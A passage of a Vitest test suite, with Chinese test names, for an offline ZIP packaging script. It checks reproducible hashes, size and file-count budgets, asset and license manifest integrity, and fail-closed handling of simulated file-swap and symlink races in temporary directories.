import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  cpSync,
  existsSync,
  mkdtempSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  symlinkSync,
  truncateSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import JSZip from "jszip";
import { externalRuntimeDependencies } from "../../scripts/offline-runtime-audit.mjs";

const repositoryRoot = resolve(import.meta.dirname, "../..");
const npmCommand = process.platform === "win32" ? "npm.cmd" : "npm";
const script = resolve(repositoryRoot, "scripts/package-offline.mjs");
const temporaryDirectories: string[] = [];
let verifiedBuildDirectory: string;

beforeAll(() => {
  verifiedBuildDirectory = mkdtempSync(join(tmpdir(), "spine-offline-verified-build-"));
  execFileSync(npmCommand, ["run", "build:offline", "--", "--outDir", verifiedBuildDirectory], {
    cwd: repositoryRoot,
    env: { ...process.env, NODE_ENV: "production" },
    stdio: "pipe",
  });
}, 30_000);

afterAll(() => {
  rmSync(verifiedBuildDirectory, { recursive: true, force: true });
});

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) rmSync(directory, { recursive: true, force: true });
});

function makeOfflineBuild(overrides: Partial<Record<"html" | "js" | "css", string>> = {}) {
  const directory = mkdtempSync(join(tmpdir(), "spine-offline-package-"));
  temporaryDirectories.push(directory);
  cpSync(verifiedBuildDirectory, directory, { recursive: true });
  const mainJs = readdirSync(join(directory, "assets")).find((name) => /^index-.*\.js$/.test(name));
  const mainCss = readdirSync(join(directory, "assets")).find((name) => /^index-.*\.css$/.test(name));
  if (overrides.html !== undefined) writeFileSync(join(directory, "offline/index.html"), overrides.html);
  if (overrides.js !== undefined && mainJs) writeFileSync(join(directory, "assets", mainJs), overrides.js);
  if (overrides.css !== undefined && mainCss) writeFileSync(join(directory, "assets", mainCss), overrides.css);
  return directory;
}

function builtAssetPath(directory: string, pattern: RegExp): string {
  const name = readdirSync(join(directory, "assets")).find((candidate) => pattern.test(candidate));
  expect(name).toBeDefined();
  return join(directory, "assets", name!);
}

function runtimePath(directory: string, version: string) {
  const runtimeName = readdirSync(join(directory, "assets"))
    .find((name) => new RegExp(`^runtime-${version}-[A-Za-z0-9_-]+\\.js$`).test(name));
  expect(runtimeName).toBeDefined();
  return join(directory, "assets", runtimeName!);
}

function packageFixture(directory: string, archive: string, extraEnvironment: Record<string, string> = {}) {
  return execFileSync(process.execPath, [script], {
    cwd: repositoryRoot,
    encoding: "utf8",
    env: {
      ...process.env,
      SPINE_OFFLINE_DIST_DIR: directory,
      SPINE_OFFLINE_ARCHIVE: archive,
      SPINE_OFFLINE_SKIP_BUILD: "1",
      ...extraEnvironment,
    },
    stdio: "pipe",
  });
}

function buildAssetDescriptors(rootDirectory: string) {
  const descriptors: Array<{ path: string; sha256: string }> = [];
  const visit = (directory: string) => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const path = join(directory, entry.name);
      if (entry.isDirectory()) {
        visit(path);
        continue;
      }
      const relativePath = relative(rootDirectory, path).replaceAll("\\", "/");
      descriptors.push({
        path: relativePath === "offline/index.html" ? "index.html" : relativePath,
        sha256: createHash("sha256").update(readFileSync(path)).digest("hex"),
      });
    }
  };
  visit(rootDirectory);
  return descriptors.sort((left, right) => left.path.localeCompare(right.path));
}

/**
 * Test-only reviewed-manifest harness: it lets an intentionally malicious
 * snapshot reach the package script's secondary semantic audit. The committed
 * production manifest is never rewritten or learned from a build.
 */
function packageFixtureThroughSemanticAudit(directory: string, archive: string) {
  const harnessRoot = mkdtempSync(join(tmpdir(), "spine-offline-audit-harness-"));
  temporaryDirectories.push(harnessRoot);
  symlinkSync(
    resolve(repositoryRoot, "node_modules"),
    join(harnessRoot, "node_modules"),
    process.platform === "win32" ? "junction" : "dir",
  );
  const harnessScripts = join(harnessRoot, "scripts");
  mkdirSync(harnessScripts);
  cpSync(script, join(harnessScripts, "package-offline.mjs"));
  cpSync(
    resolve(repositoryRoot, "scripts/offline-runtime-audit.mjs"),
    join(harnessScripts, "offline-runtime-audit.mjs"),
  );
  writeFileSync(join(harnessScripts, "offline-assets.json"), JSON.stringify({
    version: 1,
    assets: buildAssetDescriptors(directory),
  }));
  cpSync(resolve(repositoryRoot, "offline"), join(harnessRoot, "offline"), { recursive: true });

  return execFileSync(process.execPath, [join(harnessScripts, "package-offline.mjs")], {
    cwd: harnessRoot,
    encoding: "utf8",
    env: {
      ...process.env,
      SPINE_OFFLINE_DIST_DIR: directory,
      SPINE_OFFLINE_ARCHIVE: archive,
      SPINE_OFFLINE_SKIP_BUILD: "1",
    },
    stdio: "pipe",
  });
}

describe("离线包脚本", () => {
  it("同一静态构建连续打包两次产生完全相同的 SHA-256", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");

    packageFixture(directory, archive);
    const firstHash = createHash("sha256").update(readFileSync(archive)).digest("hex");
    packageFixture(directory, archive);
    const secondHash = createHash("sha256").update(readFileSync(archive)).digest("hex");

    expect(secondHash).toBe(firstHash);
  });

  it("同一真实八 Runtime 构建连续打包两次产生完全相同的 SHA-256", () => {
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-real-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");

    packageFixture(verifiedBuildDirectory, archive);
    const firstHash = createHash("sha256").update(readFileSync(archive)).digest("hex");
    packageFixture(verifiedBuildDirectory, archive);
    const secondHash = createHash("sha256").update(readFileSync(archive)).digest("hex");

    expect(secondHash).toBe(firstHash);
  });

  it.each([
    ["单文件", 1, 8 * 1024 * 1024 + 1, /单文件.*8 MiB|文件大小预算/],
    ["累计", 4, 8 * 1024 * 1024, /累计.*32 MiB|总大小预算/],
  ])("在读取前拒绝超过%s快照预算的稀疏额外文件", (_label, count, bytes, expected) => {
    const directory = makeOfflineBuild();
    for (let index = 0; index < count; index += 1) {
      const path = join(directory, `zz-budget-${index}.bin`);
      writeFileSync(path, "");
      truncateSync(path, bytes);
    }

    expect(() => packageFixture(directory, join(directory, "offline.zip"))).toThrow(expected);
  });

  it("在读取前拒绝超过文件数预算的构建树", () => {
    const directory = makeOfflineBuild();
    for (let index = 0; index < 129; index += 1) {
      writeFileSync(join(directory, `zz-count-${String(index).padStart(3, "0")}.bin`), "");
    }

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/文件数.*128|文件数量预算/);
  });

  it.each(["目录数", "深度"])("在递归打开前拒绝超过%s预算的空目录树", (kind) => {
    const directory = makeOfflineBuild();
    if (kind === "目录数") {
      for (let index = 0; index < 65; index += 1) {
        mkdirSync(join(directory, `zz-directory-${String(index).padStart(3, "0")}`));
      }
    } else {
      let nested = directory;
      for (let index = 0; index < 17; index += 1) {
        nested = join(nested, `d${index}`);
        mkdirSync(nested);
      }
    }

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(kind === "目录数" ? /目录数.*64|目录数量预算/ : /目录深度.*16|深度预算/);
  });

  it("失败打包会先隔离旧目标，不留下可误发的陈旧 ZIP", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-stale-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    writeFileSync(archive, "stale archive");
    writeFileSync(join(directory, "unreviewed.bin"), "unreviewed");

    expect(() => packageFixture(directory, archive)).toThrow();
    expect(existsSync(archive)).toBe(false);
  });

  it("提交 ZIP 前失败时不暴露半成品并清理临时目录", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-atomic-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  beforeArchiveCommit: () => { throw new Error('injected commit failure'); },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/injected commit failure/);

    expect(existsSync(archive)).toBe(false);
    expect(readdirSync(archiveDirectory)).toEqual([]);
  });

  it("提交窗口并发创建同名目标时 fail-closed 且不覆盖对方文件", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-concurrent-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { writeFile } from "node:fs/promises";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  beforeArchiveCommit: () => writeFile(process.env.SPINE_OFFLINE_ARCHIVE, 'concurrent owner'),",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/EEXIST|并发创建|拒绝覆盖/);

    expect(readFileSync(archive, "utf8")).toBe("concurrent owner");
  });

  it("临时 ZIP 在关闭后被同大小文件替换时拒绝发布替换 inode", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-temp-replacement-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { readFile, readdir, rename, writeFile } from "node:fs/promises";',
      'import { dirname, join } from "node:path";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  beforeArchiveCommit: async () => {",
      "    const parent = dirname(process.env.SPINE_OFFLINE_ARCHIVE);",
      "    const temporaryDirectory = (await readdir(parent)).find((name) => name.startsWith('.spine-offline-archive-'));",
      "    if (!temporaryDirectory) throw new Error('temporary archive directory not found');",
      "    const temporaryArchive = join(parent, temporaryDirectory, 'archive.zip');",
      "    const original = await readFile(temporaryArchive);",
      "    const replacement = `${temporaryArchive}.replacement`;",
      "    await writeFile(replacement, Buffer.alloc(original.byteLength, 0x41));",
      "    await rename(replacement, temporaryArchive);",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/identity|替换|临时 ZIP/);

    expect(existsSync(archive)).toBe(false);
  });

  it("临时 ZIP 被同 inode 同大小覆写时在发布前拒绝", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-temp-overwrite-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { readFile, readdir, writeFile } from "node:fs/promises";',
      'import { dirname, join } from "node:path";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  beforeArchiveCommit: async () => {",
      "    const parent = dirname(process.env.SPINE_OFFLINE_ARCHIVE);",
      "    const temporaryDirectory = (await readdir(parent)).find((name) => name.startsWith('.spine-offline-archive-'));",
      "    if (!temporaryDirectory) throw new Error('temporary archive directory not found');",
      "    const temporaryArchive = join(parent, temporaryDirectory, 'archive.zip');",
      "    const original = await readFile(temporaryArchive);",
      "    await writeFile(temporaryArchive, Buffer.alloc(original.byteLength, 0x42));",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/内容|SHA-256|临时 ZIP/);

    expect(existsSync(archive)).toBe(false);
  });

  it("临时目录在提交窗口被替换时保留替换目录中的 sentinel", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-temp-directory-swap-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { mkdir, readdir, rename, writeFile } from "node:fs/promises";',
      'import { dirname, join } from "node:path";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  beforeArchiveCommit: async () => {",
      "    const parent = dirname(process.env.SPINE_OFFLINE_ARCHIVE);",
      "    const temporaryName = (await readdir(parent)).find((name) => name.startsWith('.spine-offline-archive-'));",
      "    if (!temporaryName) throw new Error('temporary archive directory not found');",
      "    const temporaryDirectory = join(parent, temporaryName);",
      "    await rename(temporaryDirectory, `${temporaryDirectory}.moved`);",
      "    await mkdir(temporaryDirectory);",
      "    await writeFile(join(temporaryDirectory, 'sentinel.txt'), 'do not delete');",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow();

    const replacementName = readdirSync(archiveDirectory)
      .find((name) => name.startsWith(".spine-offline-archive-") && !name.endsWith(".moved"));
    expect(replacementName).toBeDefined();
    expect(readFileSync(join(archiveDirectory, replacementName!, "sentinel.txt"), "utf8"))
      .toBe("do not delete");
  });

  it("旧目标隔离目录在快照后被替换时保留 sentinel 并 fail closed", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-quarantine-directory-swap-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    writeFileSync(archive, "old archive");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { mkdir, readdir, rename, writeFile } from "node:fs/promises";',
      'import { dirname, join } from "node:path";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  afterSnapshot: async () => {",
      "    const parent = dirname(process.env.SPINE_OFFLINE_ARCHIVE);",
      "    const quarantineName = (await readdir(parent)).find((name) => name.startsWith('.spine-offline-previous-'));",
      "    if (!quarantineName) throw new Error('quarantine directory not found');",
      "    const quarantineDirectory = join(parent, quarantineName);",
      "    await rename(quarantineDirectory, `${quarantineDirectory}.moved`);",
      "    await mkdir(quarantineDirectory);",
      "    await writeFile(join(quarantineDirectory, 'sentinel.txt'), 'do not delete');",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/identity|替换|隔离/);

    const replacementName = readdirSync(archiveDirectory)
      .find((name) => name.startsWith(".spine-offline-previous-") && !name.endsWith(".moved"));
    expect(replacementName).toBeDefined();
    expect(readFileSync(join(archiveDirectory, replacementName!, "sentinel.txt"), "utf8"))
      .toBe("do not delete");
  });

  it("旧目标 leaf 在隔离前被目录替换时不递归删除替换内容", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-old-target-swap-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    writeFileSync(archive, "old archive");
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { mkdir, rename, writeFile } from "node:fs/promises";',
      'import { join } from "node:path";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  afterArchiveTargetOpened: async () => {",
      "    await rename(process.env.SPINE_OFFLINE_ARCHIVE, `${process.env.SPINE_OFFLINE_ARCHIVE}.original`);",
      "    await mkdir(process.env.SPINE_OFFLINE_ARCHIVE);",
      "    await writeFile(join(process.env.SPINE_OFFLINE_ARCHIVE, 'sentinel.txt'), 'do not delete');",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
      },
      stdio: "pipe",
    })).toThrow(/identity|替换|普通文件|隔离/);

    const quarantineName = readdirSync(archiveDirectory)
      .find((name) => name.startsWith(".spine-offline-previous-"));
    expect(quarantineName).toBeDefined();
    expect(readFileSync(join(archiveDirectory, quarantineName!, "previous.zip", "sentinel.txt"), "utf8"))
      .toBe("do not delete");
  });

  it("成功发布的离线 ZIP 在 POSIX 上允许其他用户读取", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-readable-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");

    packageFixture(directory, archive);

    if (process.platform !== "win32") {
      expect(statSync(archive).mode & 0o777).toBe(0o644);
    }
  });

  it("输出 ZIP 的父级路径为符号链接时在任何删除或写入前拒绝", () => {
    const directory = makeOfflineBuild();
    const actualParent = mkdtempSync(join(tmpdir(), "spine-offline-output-parent-real-"));
    const linkContainer = mkdtempSync(join(tmpdir(), "spine-offline-output-parent-link-"));
    temporaryDirectories.push(actualParent, linkContainer);
    const linkedParent = join(linkContainer, "linked");
    symlinkSync(actualParent, linkedParent, "dir");
    const archive = join(linkedParent, "offline.zip");
    const sentinel = join(actualParent, "offline.zip");
    writeFileSync(sentinel, "external sentinel");

    expect(() => packageFixture(directory, archive)).toThrow(/祖先|普通目录|符号链接|junction/);
    expect(readFileSync(sentinel, "utf8")).toBe("external sentinel");
  });

  it.each(["html", "main-js", "css", "license"])("完整资产 manifest 拒绝 %s 的单字节变化", (kind) => {
    const directory = makeOfflineBuild();
    const path = kind === "html"
      ? join(directory, "offline/index.html")
      : kind === "main-js"
        ? builtAssetPath(directory, /^index-.*\.js$/)
        : kind === "css"
          ? builtAssetPath(directory, /^index-.*\.css$/)
          : join(directory, "licenses/SPINE-RUNTIMES-LICENSE-2019.txt");
    writeFileSync(path, Buffer.concat([readFileSync(path), Buffer.from(" ")]));

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/完整资产|SHA-256|许可文件/);
  });

  it("完整资产 manifest 拒绝缺失、额外或改名文件", () => {
    for (const mutation of ["missing", "extra", "renamed"]) {
      const directory = makeOfflineBuild();
      const css = builtAssetPath(directory, /^index-.*\.css$/);
      if (mutation === "missing") rmSync(css);
      if (mutation === "extra") writeFileSync(join(directory, "assets/unreviewed.bin"), "extra");
      if (mutation === "renamed") {
        const bytes = readFileSync(css);
        rmSync(css);
        writeFileSync(join(directory, "assets/renamed.css"), bytes);
      }
      expect(() => packageFixture(directory, join(directory, "offline.zip")), mutation)
        .toThrow(/完整资产|文件集合/);
    }
  });

  it("离线 ZIP 包含三份原始 Runtime license", () => {
    const directory = makeOfflineBuild();
    const archive = join(directory, "offline.zip");
    packageFixture(directory, archive);
    const listing = execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { readFile } from "node:fs/promises";',
      'import JSZip from "jszip";',
      `const zip = await JSZip.loadAsync(await readFile(${JSON.stringify(archive)}));`,
      "console.log(Object.keys(zip.files).sort().join('\\n'));",
    ].join("\n")], { cwd: repositoryRoot, encoding: "utf8" });
    expect(listing).toContain("licenses/SPINE-RUNTIMES-LICENSE-v2.5.txt");
    expect(listing).toContain("licenses/SPINE-RUNTIMES-LICENSE-2019.txt");
    expect(listing).toContain("licenses/SPINE-RUNTIMES-LICENSE-2025.txt");
  });

  it.each([
    "SPINE-RUNTIMES-LICENSE-v2.5.txt",
    "SPINE-RUNTIMES-LICENSE-2019.txt",
    "SPINE-RUNTIMES-LICENSE-2025.txt",
  ])("许可 %s 对缺失、整份替换和单字节变化均 fail-closed", (name) => {
    const alternatives = [
      "SPINE-RUNTIMES-LICENSE-v2.5.txt",
      "SPINE-RUNTIMES-LICENSE-2019.txt",
      "SPINE-RUNTIMES-LICENSE-2025.txt",
    ].filter((candidate) => candidate !== name);
    for (const mutation of ["missing", "replaced", "single-byte"] as const) {
      const directory = makeOfflineBuild();
      const path = join(directory, "licenses", name);
      if (mutation === "missing") rmSync(path);
      if (mutation === "replaced") writeFileSync(path, readFileSync(join(directory, "licenses", alternatives[0]!)));
      if (mutation === "single-byte") {
        const bytes = readFileSync(path);
        bytes[Math.floor(bytes.length / 2)]! ^= 1;
        writeFileSync(path, bytes);
      }

      expect(() => packageFixture(directory, join(directory, `${mutation}.zip`)), `${name}: ${mutation}`)
        .toThrow(/许可文件|完整资产 manifest|SHA-256|文件集合/);
    }
  });

  it("launcher 缺失、额外或单字节改变时 fail-closed", () => {
    for (const mutation of ["missing", "extra", "changed"]) {
      const directory = makeOfflineBuild();
      const launcherDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launchers-"));
      temporaryDirectories.push(launcherDirectory);
      cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(launcherDirectory, "Start-Offline.ps1"));
      cpSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(launcherDirectory, "启动离线工具.cmd"));
      if (mutation === "missing") rmSync(join(launcherDirectory, "Start-Offline.ps1"));
      if (mutation === "extra") writeFileSync(join(launcherDirectory, "extra.ps1"), "exit 1\n");
      if (mutation === "changed") writeFileSync(
        join(launcherDirectory, "启动离线工具.cmd"),
        Buffer.concat([readFileSync(join(launcherDirectory, "启动离线工具.cmd")), Buffer.from(" ")]),
      );

      expect(() => packageFixture(directory, join(directory, "offline.zip"), {
        SPINE_OFFLINE_LAUNCHER_DIR: launcherDirectory,
      }), mutation).toThrow(/launcher|启动脚本|SHA-256|文件集合/i);
    }
  });

  it("launcher 根或叶为符号链接时拒绝", () => {
    const directory = makeOfflineBuild();
    const actualDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launchers-real-"));
    const linkParent = mkdtempSync(join(tmpdir(), "spine-offline-launchers-link-"));
    temporaryDirectories.push(actualDirectory, linkParent);
    cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(actualDirectory, "Start-Offline.ps1"));
    cpSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(actualDirectory, "启动离线工具.cmd"));
    const linkedRoot = join(linkParent, "offline");
    symlinkSync(actualDirectory, linkedRoot, "dir");

    expect(() => packageFixture(directory, join(directory, "root-link.zip"), {
      SPINE_OFFLINE_LAUNCHER_DIR: linkedRoot,
    })).toThrow(/普通目录|符号链接|junction/);

    rmSync(linkedRoot);
    mkdirSync(linkedRoot);
    cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(linkedRoot, "Start-Offline.ps1"));
    symlinkSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(linkedRoot, "启动离线工具.cmd"));
    expect(() => packageFixture(directory, join(directory, "leaf-link.zip"), {
      SPINE_OFFLINE_LAUNCHER_DIR: linkedRoot,
    })).toThrow(/普通文件|符号链接/);
  });

  it("launcher 根的父级路径为符号链接时拒绝", () => {
    const directory = makeOfflineBuild();
    const actualParent = mkdtempSync(join(tmpdir(), "spine-offline-launcher-parent-real-"));
    const linkContainer = mkdtempSync(join(tmpdir(), "spine-offline-launcher-parent-link-"));
    temporaryDirectories.push(actualParent, linkContainer);
    const actualLauncherDirectory = join(actualParent, "offline");
    mkdirSync(actualLauncherDirectory);
    cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(actualLauncherDirectory, "Start-Offline.ps1"));
    cpSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(actualLauncherDirectory, "启动离线工具.cmd"));
    const linkedParent = join(linkContainer, "parent");
    symlinkSync(actualParent, linkedParent, "dir");

    expect(() => packageFixture(directory, join(directory, "parent-link.zip"), {
      SPINE_OFFLINE_LAUNCHER_DIR: join(linkedParent, "offline"),
    })).toThrow(/祖先|普通目录|符号链接|junction/);
  });

  it("launcher 目录包含非普通文件时拒绝", () => {
    if (process.platform === "win32") return;
    const directory = makeOfflineBuild();
    const launcherDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launcher-fifo-"));
    temporaryDirectories.push(launcherDirectory);
    cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(launcherDirectory, "Start-Offline.ps1"));
    cpSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(launcherDirectory, "启动离线工具.cmd"));
    execFileSync("mkfifo", [join(launcherDirectory, "blocked.ps1")]);

    expect(() => packageFixture(directory, join(directory, "fifo.zip"), {
      SPINE_OFFLINE_LAUNCHER_DIR: launcherDirectory,
    })).toThrow(/普通文件|符号链接|特殊文件/);
  });

  it("launcher 目录枚举后被同名目录替换时按 identity fail-closed", () => {
    const directory = makeOfflineBuild();
    const launcherDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launcher-race-"));
    const replacementDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launcher-replacement-"));
    temporaryDirectories.push(launcherDirectory, `${launcherDirectory}-original`, replacementDirectory);
    for (const target of [launcherDirectory, replacementDirectory]) {
      cpSync(resolve(repositoryRoot, "offline/Start-Offline.ps1"), join(target, "Start-Offline.ps1"));
      cpSync(resolve(repositoryRoot, "offline/启动离线工具.cmd"), join(target, "启动离线工具.cmd"));
    }
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { rename } from "node:fs/promises";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  launcherDirectory: process.env.SPINE_OFFLINE_LAUNCHER_DIR,",
      "  skipBuild: true,",
      "  afterLauncherDirectoryRead: async (path) => {",
      "    if (path !== process.env.SPINE_OFFLINE_LAUNCHER_DIR) return;",
      '    await rename(path, `${path}-original`);',
      "    await rename(process.env.SPINE_OFFLINE_REPLACEMENT_DIR, path);",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: join(directory, "race.zip"),
        SPINE_OFFLINE_LAUNCHER_DIR: launcherDirectory,
        SPINE_OFFLINE_REPLACEMENT_DIR: replacementDirectory,
      },
      stdio: "pipe",
    })).toThrow(/目录.*替换|identity|枚举与读取/);
  });

  it("launcher 快照后的磁盘内容变化不会改变已校验并写入 ZIP 的 bytes", async () => {
    const directory = makeOfflineBuild();
    const launcherDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launcher-snapshot-"));
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-launcher-snapshot-archive-"));
    temporaryDirectories.push(launcherDirectory, archiveDirectory);
    for (const name of ["Start-Offline.ps1", "启动离线工具.cmd"]) {
      cpSync(resolve(repositoryRoot, "offline", name), join(launcherDirectory, name));
    }
    const targetPath = join(launcherDirectory, "Start-Offline.ps1");
    const safeContents = readFileSync(targetPath);
    const replacement = Buffer.from("Write-Error 'snapshot bypass'\n");
    const archive = join(archiveDirectory, "offline.zip");
    const moduleUrl = pathToFileURL(script).href;

    execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { writeFile } from "node:fs/promises";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  launcherDirectory: process.env.SPINE_OFFLINE_LAUNCHER_DIR,",
      "  skipBuild: true,",
      "  afterSnapshot: () => writeFile(process.env.SPINE_OFFLINE_REPLACE_PATH, process.env.SPINE_OFFLINE_REPLACEMENT),",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
